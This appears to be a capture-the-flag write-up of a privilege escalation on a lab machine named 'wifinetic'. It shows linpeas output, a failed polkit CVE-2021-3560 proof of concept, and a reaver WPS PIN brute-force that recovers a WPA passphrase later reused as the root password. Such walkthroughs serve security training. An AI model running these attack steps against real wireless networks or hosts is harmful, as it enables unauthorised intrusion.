Got a shell with `netadmin:Ve<SNIP>1!`
See [03 - FTP Access](03%20-%20FTP%20Access.md)

```
netadmin@wifinetic:~$ whoami
netadmin
netadmin@wifinetic:~$ id
uid=1000(netadmin) gid=1000(netadmin) groups=1000(netadmin)
netadmin@wifinetic:~$ sudo -l
[sudo] password for netadmin: 
Sorry, user netadmin may not run sudo on wifinetic.
```

# Linpeas
snippets
```
Vulnerable to CVE-2021-3560

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb0:ee1e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:ee1e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:ee:1e  txqueuelen 1000  (Ethernet)
        RX packets 134290  bytes 9069143 (9.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 133901  bytes 9995057 (9.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5340  bytes 321396 (321.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5340  bytes 321396 (321.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 24400  bytes 4298036 (4.2 MB)
        RX errors 0  dropped 24400  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 812  bytes 77160 (77.1 KB)

wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 244  bytes 33657 (33.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 812  bytes 91776 (91.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        
╔══════════╣ Running processes (cleaned)
<SNIP>
root        1151  0.0  0.0   6972  3520 ?        Ss   22:34   0:00 /bin/bash /usr/local/bin/wps_check.sh
<SNIP>
:1.69                          4748 wpa_supplicant  root             :1.69         wpa_supplicant.service


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net
_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep


```

Turns out not to be vulnerable to polkit after all.
```
netadmin@wifinetic:/dev/shm$ ./poc.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!
```

# Investigating wireless interfaces
```
netadmin@wifinetic:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:97:36 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.247/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb0:9736/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb0:9736/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global wlan0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:0/64 scope link 
       valid_lft forever preferred_lft forever
4: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic wlan1
       valid_lft 43084sec preferred_lft 43084sec
    inet6 fe80::ff:fe00:100/64 scope link 
       valid_lft forever preferred_lft forever
5: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
6: hwsim0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
7: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff

```

### iwlist command
```
netadmin@wifinetic:~$ man iwlist | head -n 5
IWLIST(8)                Linux Programmer's Manual                IWLIST(8)

NAME
       iwlist  - Get more detailed wireless information from a wireless in‐
       terface

netadmin@wifinetic:~$ iwlist scanning
wlan1     Scan completed :
          Cell 01 - Address: 02:00:00:00:00:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"OpenWrt"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=0006402fb3b613a8
                    Extra: Last beacon: 64ms ago
                    IE: Unknown: 00074F70656E577274
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010362DB47BA53A519188FB5458B986B2E41021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120

wlan0     No scan results

eth0      Interface doesn't support scanning.

hwsim0    Interface doesn't support scanning.

lo        Interface doesn't support scanning.

mon0      No scan results

wlan2     No scan result
```

The wlan1 address is `02:00:00:00:00:00`

### Cracking WPS and WPA with reaver
```
netadmin@wifinetic:~$ man reaver | head -n 18
Reaver(1)                 General Commands Manual                 Reaver(1)

NAME
       Reaver - WPS Cracker

SYNOPSIS
       reaver -i <interface> -b <target bssid> -vv

DESCRIPTION
       Reaver  implements a brute force attack against WiFi Protected Setup
       which can crack the WPS pin of an access point in a matter of  hours
       and subsequently recover the WPA/WPA2 passphrase.

       Specifically,  Reaver  targets  the  registrar functionality of WPS,
       which is flawed in that it only takes 11,000 attempts to  guess  the
       correct  WPS  pin in order to become a WPS registrar. Once registred
       as a registrar with the access point, the access point will give you
       the WPA passphrase.
       
netadmin@wifinetic:~$ which reaver
/usr/bin/reaver


netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'Wh<SNIP>1!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

These credentials are valid for root. They are redacted above.
They also allow for direct SSH access.
```
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# whoami
root
root@wifinetic:/home/netadmin# id
uid=0(root) gid=0(root) groups=0(root)

```

```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.247
root@10.10.11.247's password: 
<SNIP>
root@wifinetic:~# 

```